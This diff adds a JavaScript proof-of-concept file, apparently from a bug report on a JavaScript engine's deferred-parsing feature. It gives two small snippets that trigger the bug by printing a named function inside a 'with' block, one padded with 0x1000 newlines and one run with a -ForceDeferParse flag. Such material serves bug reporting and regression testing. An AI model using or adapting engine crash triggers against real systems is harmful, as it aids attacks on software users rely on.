@@ -1,0 +1,24 @@
+/*
+Since the PoC is only triggerable when the "DeferParse" flag enabled and requires a with statement, I think this is simillar to  issue 1310 .
+
+PoC:
+*/
+
+// Enable the flag using '\n'.repeat(0x1000)
+eval(`(function f() {
+    with ({}) {
+        (function () {
+            print(f);
+        })();
+    }
+}());` + '\n'.repeat(0x1000));
+
+PoC 2:
+// ./ch poc.js -ForceDeferParse
+(function f() {
+    with ({}) {
+        (function () {
+            print(f);
+        })();
+    }
+}());
